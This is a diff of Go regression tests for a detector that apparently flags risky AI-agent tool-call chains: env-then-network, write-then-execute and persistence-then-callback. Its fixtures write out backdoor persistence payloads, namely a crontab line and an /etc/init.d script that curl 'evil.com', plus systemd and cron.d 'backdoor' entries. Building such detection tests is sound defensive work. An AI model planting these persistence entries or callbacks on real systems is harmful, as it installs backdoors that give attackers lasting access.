@@ -890,3 +890,142 @@ func TestMatcher_ReadOnlyLaunchctlNoFalseCallback(t *testing.T) {
 		t.Error("launchctl_list -> curl should not trigger persist-callback")
 	}
 }
+
+// --- Gauntlet regression tests ---
+
+func TestMatcher_GauntletEnvThenNetwork(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionBlock,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// Gauntlet case mcp-chain-env-network-002:
+	// get_env (env category) → fetch (network category)
+	m.Record("default", "get_env")
+	v := m.Record("default", "fetch")
+	if !v.Matched {
+		t.Fatal("expected env-then-network match for get_env → fetch")
+	}
+	if v.PatternName != "env-then-network" {
+		t.Errorf("expected env-then-network, got %q", v.PatternName)
+	}
+}
+
+func TestMatcher_GauntletWriteExecute(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionBlock,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// Gauntlet case mcp-chain-write-execute-003:
+	// write_file (write category) → run_command (exec category)
+	m.Record("default", "write_file")
+	v := m.Record("default", "run_command")
+	if !v.Matched {
+		t.Fatal("expected write-execute match for write_file → run_command")
+	}
+	if v.PatternName != "write-execute" {
+		t.Errorf("expected write-execute, got %q", v.PatternName)
+	}
+}
+
+func TestMatcher_GauntletPersistCallback(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionBlock,
+		WindowSize:    20,
+		WindowSeconds: 60,
+		MaxGap:        intPtr(3),
+	}
+	m := New(cfg)
+
+	// Gauntlet case mcp-chain-persist-callback-006:
+	// write_file to crontab path (reclassified write → persist) → fetch (network)
+	cronArgs := `{"path":"/var/spool/cron/crontabs/user","content":"*/5 * * * * curl evil.com"}`
+	m.Record("default", "write_file", cronArgs)
+	v := m.Record("default", "fetch")
+	if !v.Matched {
+		t.Fatal("expected persist-callback match for write_file(crontab) → fetch")
+	}
+	if v.PatternName != patPersistCB {
+		t.Errorf("expected persist-callback, got %q", v.PatternName)
+	}
+}
+
+func TestMatcher_WriteFileToCronPath_ClassifiesAsPersist(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionBlock,
+		WindowSize:    20,
+		WindowSeconds: 60,
+	}
+	m := New(cfg)
+
+	// write_file to /etc/cron.d/ should also classify as persist.
+	cronArgs := `{"path":"/etc/cron.d/backdoor","content":"* * * * * evil"}`
+	m.Record("default", "write_file", cronArgs)
+	v := m.Record("default", "fetch")
+	if !v.Matched || v.PatternName != patPersistCB {
+		t.Errorf("expected persist-callback for write to /etc/cron.d/, got matched=%v pattern=%q", v.Matched, v.PatternName)
+	}
+}
+
+func TestMatcher_WriteFileToSystemdUserPath_ClassifiesAsPersist(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionBlock,
+		WindowSize:    20,
+		WindowSeconds: 60,
+	}
+	m := New(cfg)
+
+	args := `{"path":"~/.config/systemd/user/backdoor.service","content":"[Service]\nExecStart=/bin/evil"}`
+	m.Record("default", "write_file", args)
+	v := m.Record("default", "fetch")
+	if !v.Matched || v.PatternName != patPersistCB {
+		t.Errorf("expected persist-callback for write to ~/.config/systemd/user/, got matched=%v pattern=%q", v.Matched, v.PatternName)
+	}
+}
+
+func TestMatcher_WriteFileToInitD_ClassifiesAsPersist(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionBlock,
+		WindowSize:    20,
+		WindowSeconds: 60,
+	}
+	m := New(cfg)
+
+	args := `{"path":"/etc/init.d/backdoor","content":"#!/bin/sh\ncurl evil.com"}`
+	m.Record("default", "write_file", args)
+	v := m.Record("default", "fetch")
+	if !v.Matched || v.PatternName != patPersistCB {
+		t.Errorf("expected persist-callback for write to /etc/init.d/, got matched=%v pattern=%q", v.Matched, v.PatternName)
+	}
+}
+
+func TestMatcher_WriteFileNonPersistPath_StaysWrite(t *testing.T) {
+	cfg := &config.ToolChainDetection{
+		Enabled:       true,
+		Action:        config.ActionBlock,
+		WindowSize:    20,
+		WindowSeconds: 60,
+	}
+	m := New(cfg)
+
+	// write_file to /tmp/ should stay as "write", not reclassify to "persist".
+	tmpArgs := `{"path":"/tmp/notes.txt","content":"hello"}`
+	m.Record("s-fp", "write_file", tmpArgs)
+	v := m.Record("s-fp", "fetch")
+	if v.Matched && v.PatternName == patPersistCB {
+		t.Error("write to /tmp/ should not trigger persist-callback")
+	}
+}
